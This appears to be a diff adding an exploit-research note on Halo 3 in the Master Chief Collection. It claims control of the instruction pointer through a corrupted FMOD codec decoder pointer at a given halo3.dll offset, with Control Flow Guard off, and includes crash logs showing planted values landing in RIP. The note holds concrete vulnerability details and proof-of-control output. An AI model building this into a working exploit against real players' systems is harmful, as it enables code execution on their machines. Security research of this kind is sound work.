@@ -1,0 +1,13 @@
+# Confirmed RIP control in the REAL halo3.dll (MCC), via the FMOD decode sink
+# readData dispatcher halo3+0x500e00 does: call qword ptr [instance+0xa8]  (GuardCF OFF)
+# instance+0xa8 = a corrupted codec-instance decoder fn-ptr (what a heap overflow/UAF of the FSB codec object leaves).
+# Each planted value becomes RIP exactly -> arbitrary PC control. Reproduced below, deterministically:
+
+RIPTEST: real halo3+0x500e00 (readData), instance+0xa8=0x4141414141414141, CFG=off
+[CRASH] sig=11 faultaddr=0x4141414141414141 RIP=0x4141414141414141 (?+0x0)
+RIPTEST: real halo3+0x500e00 (readData), instance+0xa8=0xdeadbeef13371337, CFG=off
+[CRASH] sig=11 faultaddr=0xdeadbeef13371337 RIP=0xdeadbeef13371337 (?+0x0)
+RIPTEST: real halo3+0x500e00 (readData), instance+0xa8=0x0000414243444546, CFG=off
+[CRASH] sig=11 faultaddr=0x414243444546 RIP=0x414243444546 (?+0x0)
+RIPTEST: real halo3+0x500e00 (readData), instance+0xa8=0xcafebabe41414141, CFG=off
+[CRASH] sig=11 faultaddr=0xcafebabe41414141 RIP=0xcafebabe41414141 (?+0x0)
